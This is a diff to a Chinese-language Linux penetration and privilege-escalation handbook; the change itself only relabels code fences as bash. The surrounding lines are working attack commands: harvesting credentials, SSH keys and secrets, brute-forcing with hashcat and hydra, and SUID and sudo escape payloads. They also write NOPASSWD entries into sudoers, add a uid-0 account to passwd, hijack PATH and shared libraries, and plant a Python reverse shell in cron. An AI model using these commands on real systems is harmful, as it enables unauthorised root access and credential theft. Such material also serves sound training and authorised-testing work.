@@ -14,7 +14,7 @@ description: 本文为独立 Linux 内网渗透专项手册，涵盖系统信息
 
 ### 1\. 内核版本探测（内核提权前置）
 
-```Plain Text
+```bash
 # 查看完整内核、系统架构信息
 uname -a
 
@@ -28,7 +28,7 @@ cat /proc/version
 
 ### 3\. 用户与权限枚举
 
-```Plain Text
+```bash
 # 筛选home目录下拥有bash登录权限的用户
 cat /etc/passwd | grep home | grep bash
 
@@ -38,7 +38,7 @@ cd /home; ls -al
 
 ### 4\. 环境变量与历史命令抓取
 
-```Plain Text
+```bash
 # 查看系统全部环境变量（可能泄露路径、密钥、代理、账号信息）
 env
 set
@@ -51,7 +51,7 @@ history
 
 适用于抓取 Linux shadow 哈希后，本地离线暴力破解
 
-```Plain Text
+```bash
 # 1. 纯数字 1~8位 递增爆破（自动启停）
 hashcat -m 1800 哈希值 -a 3 -i --increment-min 1 --increment-max 8 ?d?d?d?d?d?d?d?d
 
@@ -61,7 +61,7 @@ hashcat -m 1800 哈希值 -a 3 -i --increment-min 1 --increment-max 6 ?h?h?h?h?h
 
 ## 三、进程、服务、计划任务枚举
 
-```Plain Text
+```bash
 # 查看系统全部进程、运行服务、可疑后台程序
 ps aux
 
@@ -79,7 +79,7 @@ cat /etc/crontab
 
 原理：抓取各用户私钥 id\_rsa，本地修改权限 600 即可免密登录对应账号
 
-```Plain Text
+```bash
 # 遍历所有用户目录，查找SSH私钥（排除公钥）
 find /home /root -name "id_*" -path "*/.ssh/*" -not -name "*.pub" -ls 2>/dev/null
 
@@ -89,7 +89,7 @@ find /home /root -name "id_*" -path "*/.ssh/*" -not -name "*.pub" -exec ls -l {}
 
 ## 五、系统明文密码检索
 
-```Plain Text
+```bash
 # 全局检索6位以上大小写+数字组合明文密码（排除系统临时目录）
 grep -rn ".*[0-9a-zA-Z]{6,}" /etc /home /root --exclude-dir={proc,sys,dev,tmp} 2>/dev/null
 
@@ -105,13 +105,13 @@ grep -R -i pass /home/* 2>/dev/null
 
 拿到密码字典后使用 Hydra 批量爆破 SSH：
 
-```Plain Text
+```bash
 hydra -L 用户字典.txt -P 密码字典.txt 目标IP ssh
 ```
 
 ## 七、日志信息排查（溯源 \& 信息挖掘）
 
-```Plain Text
+```bash
 # 系统全局日志
 /var/log
 
@@ -132,7 +132,7 @@ cat /var/log/nginx/error.log
 
 原理：root所属文件被错误配置SUID\(4000\)权限，普通用户执行可提升至root权限
 
-```Plain Text
+```bash
 # 查找所有root用户、带SUID权限的程序
 find / -user root -perm -4000 -print 2>/dev/null
 
@@ -142,7 +142,7 @@ ls -la /var/www/backup/procwatch
 
 #### 常见可利用SUID程序逃逸Payload
 
-```Plain Text
+```bash
 # 1. tmp目录执行逃逸
 find /tmp -exec /bin/sh -p \; -quit
 
@@ -173,7 +173,7 @@ sudo gcc -wrapper /bin/sh,-s .
 
 原理：程序调用系统命令（ps/sh/tail等）未写绝对路径，可伪造同名恶意程序，劫持执行root权限命令
 
-```Plain Text
+```bash
 # 方式1：伪造ps劫持
 ln -s /bin/sh ps
 export PATH=.:$PATH
@@ -193,7 +193,7 @@ sudo --preserve-env=PATH /usr/bin/check_syslog.sh
 
 ### 3\. Sudo 权限滥用提权（最全合集）
 
-```Plain Text
+```bash
 # 查看当前用户所有sudo免密权限
 sudo -l
 
@@ -203,7 +203,7 @@ sudo su
 
 #### 3\.1 可写文件枚举
 
-```Plain Text
+```bash
 # 全局查找777权限可写文件
 find / -perm 0777 -type f 2>/dev/null
 
@@ -213,7 +213,7 @@ find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v var
 
 #### 3\.2 Git 提权
 
-```Plain Text
+```bash
 sudo git help config
 # 输入 !/bin/bash 逃逸交互Shell
 !/bin/bash
@@ -221,28 +221,28 @@ sudo git help config
 
 #### 3\.3 指定低权限用户执行恶意脚本
 
-```Plain Text
+```bash
 echo '/bin/bash' >> backups.sh
 sudo -u jens ./backups.sh
 ```
 
 #### 3\.4 Teehee 写入sudoers提权（万能提权）
 
-```Plain Text
+```bash
 # 赋予当前用户全部sudo权限无密码
 echo 'charles ALL=(ALL:ALL) NOPASSWD:ALL' | sudo teehee -a /etc/sudoers
 ```
 
 #### 3\.5 Nmap NSE脚本提权
 
-```Plain Text
+```bash
 echo 'os.execute("/bin/sh")' > getshell.nse
 sudo nmap --script=getshell.nse
 ```
 
 #### 3\.6 自定义系统用户（passwd写入）
 
-```Plain Text
+```bash
 # 生成自定义密码哈希
 openssl passwd 123456
 
@@ -252,7 +252,7 @@ kali:bwfgXppOVV0PI:0:0::/root:/bin/bash
 
 #### 3\.7 Mv 命令劫持提权
 
-```Plain Text
+```bash
 sudo mv /bin/tar /bin/tar.orgi
 sudo mv /bin/su /bin/tar
 # 执行tar触发su权限
@@ -261,7 +261,7 @@ sudo tar
 
 #### 3\.8 Perl / grc 提权
 
-```Plain Text
+```bash
 # Perl反弹bash
 sudo perl -e 'exec "/bin/bash";'
 
@@ -273,7 +273,7 @@ sudo grc --pty /bin/sh
 
 代表漏洞：脏牛（Dirty COW），适用于低版本Linux内核
 
-```Plain Text
+```bash
 # 查看内核版本
 uname -a
 
@@ -287,7 +287,7 @@ searchsploit 2.6.3 Local
 
 原理：root定时任务调用可编辑脚本/文件，低权限用户写入反弹Shell，等待定时执行
 
-```Plain Text
+```bash
 # 查看定时任务
 cat /etc/crontab
 
@@ -303,7 +303,7 @@ nc -lvp 7777
 
 #### Python定时任务反弹Shell
 
-```Plain Text
+```bash
 #!/usr/bin/env python
 import socket,os,pty
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -316,7 +316,7 @@ pty.spawn("/bin/sh")
 
 ### 6\. rbash 受限Shell逃逸
 
-```Plain Text
+```bash
 # 查看当前环境变量
 echo $PATH
 
@@ -338,7 +338,7 @@ su jerry
 
 #### sshpass 免密登录逃逸
 
-```Plain Text
+```bash
 # 首次登录后可免密交互
 sshpass -p 'P@55W0rd1!2@' ssh mindy@192.168.79.176 -t bash
 ```
@@ -347,7 +347,7 @@ sshpass -p 'P@55W0rd1!2@' ssh mindy@192.168.79.176 -t bash
 
 适用版本：Bash \< 4\.3
 
-```Plain Text
+```bash
 # 查看bash版本
 bash --version
 
@@ -362,7 +362,7 @@ Env x='() { :; }; echo /bin/echo "user ALL=(ALL)ALL" >> /etc/sudoers'
 
 原理：程序加载自定义动态链接库，可写目录覆盖so文件实现代码执行
 
-```Plain Text
+```bash
 # 编译恶意so共享库
 gcc -shared -fPIC -o demo.so demo.c -nostartfiles
 
@@ -372,7 +372,7 @@ gcc -shared -fPIC -o demo.so demo.c -nostartfiles
 
 ### 9\. Capabilities 权限机制提权
 
-```Plain Text
+```bash
 # 扫描系统特殊Capability权限
 getcap -r / 2>/dev/null
 
